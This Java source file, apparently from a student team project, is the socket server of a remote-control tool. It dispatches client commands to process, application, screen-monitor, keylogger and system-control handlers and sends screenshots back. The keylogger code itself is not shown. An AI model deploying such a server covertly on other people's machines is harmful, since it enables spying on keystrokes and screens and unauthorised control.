package team6.server.socket;

import java.awt.AWTException;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;
import team6.server.handler.AbstractHandler;
import team6.server.handler.Applications;
import team6.server.handler.Keylogger;
import team6.server.handler.Monitor;
import team6.server.handler.Processes;
import team6.server.handler.SystemCtrl;


public class SocketHandler {
    private Socket socket;
    private int port;
    
    private BufferedReader in;
    private DataOutputStream out;
    
    private AbstractHandler currentHandler;
    
    public SocketHandler(int port) throws IOException, AWTException {
        ServerSocket serverSocket = new ServerSocket(port);
        
        while (true) {
            System.out.println("Waiting for connection ...");
            socket = serverSocket.accept();
            System.out.println("Successfully connected!");
            
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            out = new DataOutputStream(socket.getOutputStream());
            
            receive();
        }
        
        
    }
    
    // Format of message: "<HANDLER>$<COMMAND>$<DATA>"
    // i.e: <APP>$<GET>$<>
    
    private void receive() throws IOException, AWTException {
        String buffer = null;
        String[] message = null;
        String preHandler = "";
        System.out.println("Receiving message ...");
        
        while(true) {
            if (in == null) continue;
            buffer = in.readLine();
            if (buffer == null || buffer.length() <= 0) continue;                        

            System.out.println("RECEIVED: " + buffer);
            // message[0] is handler, [1] is command, [2] is data
            message = buffer.split("\\$",2);   

            // If handler is defined before, just do the commands
            if (message[0].equals(preHandler)) {
                // execute command with previous handler
                currentHandler.executeCommand(message[1]);
                continue;
            }

            // if this is the first time call the handler   
            // -> save the handler
            preHandler = message[0];
            
            if(message[0].equals("<PROCESS>")){
                // call process handler
                System.out.println("Calling process handler ...");
                currentHandler = new Processes(SocketHandler.this);
                continue;
            }

            if(message[0].equals("<APP>")){
                // call apps handler
                System.out.println("Calling application handler ...");
                currentHandler = new Applications(SocketHandler.this);
                continue;
            }

            if(message[0].equals("<MONITOR>")){
                // call monitor hanlder;
                System.out.println("Calling monitor handler ...");
                currentHandler = new Monitor(SocketHandler.this);
                continue;
            }

            if(message[0].equals("<KEYLOG>")){
                // call keyloger handler;
                System.out.println("Calling keylogger handler ...");
                currentHandler = new Keylogger(SocketHandler.this);
                continue;
            }

            if(message[0].equals("<SYSTEM>")){
                // call system handler;
                System.out.println("Calling system handler ...");
                currentHandler = new SystemCtrl(SocketHandler.this);
                continue;
            }

            if (message[0].equals("<DISC>")) {
                // disconnect the connection socket and restart listening on port
                close();
                break;
            }
            
        }
        
        System.out.println("Stopping receiving messages");
    }
    
    public void send(byte[] byteArrToSend, int size) {
        Thread th = new Thread() {
            @Override
            public void run() {
                try {
                    out.writeInt(size);
                    out.write(byteArrToSend);
                    out.flush();
                    System.out.println("SENT: ");
                    System.out.println(new String(byteArrToSend));
                }
                catch(IOException e) {
                    e.printStackTrace();
                }
            }
        };
        
        th.start();
    }
    
    public void send(BufferedImage image) {
        Thread th = new Thread() {
          @Override 
          public void run() {
              try {
                  ImageIO.write(image, "jpeg", out);
                  //out.flush();
                  System.out.println("SENT: image!");
              } catch (IOException ex) {
                  Logger.getLogger(SocketHandler.class.getName()).log(Level.SEVERE, null, ex);
              }
              
          }
        };
        th.start();
    }
    
    private void close() {
        try {
            in.close();
            out.close();
            socket.close();
            
            in = null;
            out = null;
            socket = null;
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

}